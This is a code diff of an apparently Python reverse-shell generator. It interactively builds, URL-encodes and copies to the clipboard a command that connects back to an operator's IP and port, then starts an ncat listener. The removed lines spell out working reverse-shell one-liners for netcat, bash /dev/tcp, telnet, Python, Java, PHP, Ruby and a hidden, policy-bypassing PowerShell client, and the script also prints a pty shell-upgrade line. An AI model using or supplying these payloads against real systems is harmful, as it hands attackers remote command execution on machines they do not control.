@@ -2,7 +2,6 @@
 # coding=utf-8
 import ipaddress
 import os
-import socket
 import urllib.parse
 from string import Template
 from typing import List
@@ -20,71 +19,39 @@ banner = '''
                                            /___/
 '''
 
-success = Style.BRIGHT + '[ ' + Fore.GREEN + '+' + Fore.RESET + ' ] ' + Style.RESET_ALL
-information = Style.BRIGHT + '[ ' + Fore.YELLOW + '!' + Fore.RESET + ' ] ' + Style.RESET_ALL
-failure = Style.BRIGHT + '[ ' + Fore.RED + '-' + Fore.RESET + ' ] ' + Style.RESET_ALL
+header = Template(
+    '\n' + Style.BRIGHT + '---------- [ ' + Fore.CYAN + '$text' + Fore.RESET + ' ] ----------' + Style.RESET_ALL + '\n'
+)
+prompt = Template(
+    Style.BRIGHT + '[' + Fore.BLUE + ' # ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text : ' + Style.BRIGHT
+)
+code = Template(Style.BRIGHT + Fore.GREEN + '$code' + Style.RESET_ALL)
+success = Template(Style.BRIGHT + '[' + Fore.GREEN + ' + ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text')
+info = Template(Style.BRIGHT + '[' + Fore.YELLOW + ' ! ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text')
+fail = Template(Style.BRIGHT + '[' + Fore.RED + ' - ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text')
 
-# defaults
-ip = socket.gethostbyname(socket.gethostname())
-port = 443
-shell = '/bin/sh'
-command_key = 'nc plain'
-
-header_template = Template('\n' + Style.BRIGHT + '---------- [ ' + Fore.CYAN + '$param' +
-                           Fore.RESET + ' ] ----------' + Style.RESET_ALL + '\n')
-
-shells = {
-    'sh': '/bin/sh',
-    'bash': '/bin/bash',
-    'zsh': '/bin/zsh',
-    'ksh': '/bin/ksh',
-    'tcsh': '/bin/tcsh',
-    'dash': '/bin/dash'
-}
-
-commands = {
-    'nc plain': Template('nc -e $shell $ip $port'),
-    'nc mkfifo': Template('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|$shell -i 2>&1|nc $ip $port >/tmp/f'),
-    'telnet': Template('rm -f /tmp/p; mknod /tmp/p p && telnet $ip $port 0/tmp/p'),
-    'bash': Template('bash -i >& /dev/tcp/$ip/$port 0>&1'),
-    'python': Template('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
-                       's.connect(("$ip",$port));'
-                       'os.dup2(s.fileno(),0);'
-                       'os.dup2(s.fileno(),1);'
-                       'os.dup2(s.fileno(),2);'
-                       'p=subprocess.call(["$shell","-i"]);\''),
-    'java': Template('r = Runtime.getRuntime()'
-                     'p = r.exec(["$shell","-c","exec 5<>/dev/tcp/$ip/$port;'
-                     'cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'
-                     'p.waitFor()'),
-    'php': Template('php -r \'$sock=fsockopen("$ip",$port);exec("$shell -i <&3 >&3 2>&3");\''),
-    'ruby': Template('ruby -rsocket -e \'f=TCPSocket.open("$ip",$port).to_i;'
-                     'exec sprintf("$shell -i <&%d >&%d 2>&%d",f,f,f)\''),
-    'powershell': Template('powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object '
-                           'System.Net.Sockets.TCPClient("$ip",$port);'
-                           '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};'
-                           'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)'
-                           '{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
-                           '$sendback = (iex $data 2>&1 | Out-String );'
-                           '$sendback2  = $sendback + "PS " + (pwd).Path + "> ";'
-                           '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
-                           '$stream.Write($sendbyte,0,$sendbyte.Length);'
-                           '$stream.Flush()};$client.Close()')
-}
+ip = port = shell = command = ''
 
 choices = ['no', 'yes']
+shells = ['/bin/sh', '/bin/bash', '/bin/zsh', '/bin/ksh', '/bin/tcsh', '/bin/dash']
+commands = sorted([command for command in os.listdir('commands')])
 
 
-def is_valid(param_ip):
+def print_banner():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(banner)
+
+
+def is_valid(ip_address):
     try:
-        ipaddress.ip_address(param_ip)
+        ipaddress.ip_address(ip_address)
         return True
     except ValueError:
         return False
 
 
 def exit_program():
-    print('\n' + success + 'Goodbye, friend.')
+    print('\n' + success.safe_substitute(text='Goodbye, friend.'))
     exit(0)
 
 
@@ -119,96 +86,88 @@ def select(
 
 
 def specify_ip():
-    print(header_template.safe_substitute(param='SELECT IP'))
+    print(header.safe_substitute(text='SELECT IP'))
     options = {}
     for interface in interfaces():
         try:
             ip_address = ifaddresses(interface)[AF_INET][0]['addr']
             if ip_address != '127.0.0.1':
-                options[ip_address] = ip_address + ' IP address on interface ' + interface
+                options[ip_address] = ip_address + ' on ' + interface
         except KeyError:
             pass
-    options['other'] = 'Specify IP address manually'
-    key_index = select(list(options.values()))
+    options['manual'] = 'Specify manually'
     global ip
-    ip = list(options.keys()).__getitem__(key_index)
-    if ip == 'other':
+    ip = list(options.keys())[(select(list(options.values())))]
+    if ip == 'manual':
         while True:
-            input_ip = input('Enter IP address: ')
+            input_ip = input(prompt.safe_substitute(text='Enter IP address'))
             if is_valid(input_ip):
                 ip = input_ip
-                print(information + 'IP changed to -> ' + Style.BRIGHT + Fore.YELLOW + ip + Style.RESET_ALL)
                 break
             else:
-                print(failure + 'Please, specify a valid IP address!')
+                print(fail.safe_substitute(text='Please, specify a valid IP address!'))
 
 
 def specify_port():
-    print(header_template.safe_substitute(param='SPECIFY PORT'))
+    print(header.safe_substitute(text='SPECIFY PORT'))
     while True:
         try:
-            global port
-            input_port = input(Style.BRIGHT + '[ default ' + Fore.GREEN + str(port) +
-                               Fore.RESET + ' ]' + Style.RESET_ALL + ' : ')
-            if input_port.__eq__(''):
-                break
-            elif int(input_port) in range(1, 65535):
-                port = int(input_port)
-                print(information + 'Port changed to -> ' + Style.BRIGHT + Fore.YELLOW + str(port) + Style.RESET_ALL)
+            input_port = input(prompt.safe_substitute(text='Enter port number'))
+            if int(input_port) in range(1, 65535):
+                global port
+                port = input_port
                 break
             else:
                 raise ValueError
         except ValueError:
-            print(failure + 'Choose a valid port number!')
+            print(fail.safe_substitute(text='Please, choose a valid port number!'))
 
 
 def select_command():
-    print(header_template.safe_substitute(param='SELECT COMMAND'))
-    selected_command = select(list(commands.keys()))
-    global command_key
-    command_key = list(commands.keys()).__getitem__(selected_command)
+    print(header.safe_substitute(text='SELECT COMMAND'))
+    global command
+    command = commands[select(commands)]
 
 
 def select_shell():
-    if command_key != 'powershell':
-        print(header_template.safe_substitute(param='SELECT SHELL'))
-        selected_shell = select(list(shells.keys()))
+    if command != 'windows_powershell' and command != 'unix_bash' and command != 'unix_telnet':
+        print(header.safe_substitute(text='SELECT SHELL'))
         global shell
-        shell = list(shells.values()).__getitem__(selected_shell)
+        shell = shells[(select(shells))]
 
 
 def build_command():
-    command = commands.get(command_key).safe_substitute(ip=ip, port=port, shell=shell)
-    print(header_template.safe_substitute(param='URL ENCODE'))
-    result = select(choices)
-    if result == 1:
+    global command
+    with open('commands/' + command) as f:
+        command = Template(f.read())
+    command = command.safe_substitute(ip=ip, port=port, shell=shell)
+    print(header.safe_substitute(text='URL ENCODE'))
+    if select(choices) == 1:
         command = urllib.parse.quote_plus(command)
-        print(information + 'Command is now URL encoded!')
+        print(info.safe_substitute(text='Command is now URL encoded!'))
 
-    print(header_template.safe_substitute(param='FINISHED COMMAND'))
-    print(Style.BRIGHT + Fore.YELLOW + command + Fore.RESET + Style.RESET_ALL + '\n')
+    print(header.safe_substitute(text='FINISHED COMMAND'))
+    print(code.safe_substitute(code=command) + '\n')
 
     if 'SSH_CLIENT' not in os.environ or 'SSH_TTY' not in os.environ:
         copy(command)
-        print(information + 'Reverse shell command copied to clipboard!' + '\n')
+        print(info.safe_substitute(text='Reverse shell command copied to clipboard!'))
 
-    print(success + 'In case you want to upgrade your shell, you can use:' + '\n')
-    print(Style.BRIGHT + Fore.YELLOW + "python -c 'import pty;pty.spawn(\"/bin/bash\")'" + Fore.RESET + Style.RESET_ALL)
+    print(success.safe_substitute(text='In case you want to upgrade your shell, you can use this:\n'))
+    print(code.safe_substitute(code="python -c 'import pty;pty.spawn(\"/bin/bash\")'"))
 
 
 def setup_listener():
-    print(header_template.safe_substitute(param='SETUP LISTENER'))
-    result = select(choices)
-    if result == 1:
-        print('\n' + information + 'Launching ncat ...' + '\n')
-        os.system('$(which ncat) -nlvp ' + str(port))
-    else:
-        exit_program()
+    if os.name != 'nt':
+        print(header.safe_substitute(text='SETUP LISTENER'))
+        if select(choices) == 1:
+            os.system('\n$(which ncat || which nc) -nlvp ' + port)
+        else:
+            exit_program()
 
 
 if __name__ == '__main__':
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(banner)
+    print_banner()
     try:
         specify_ip()
         specify_port()
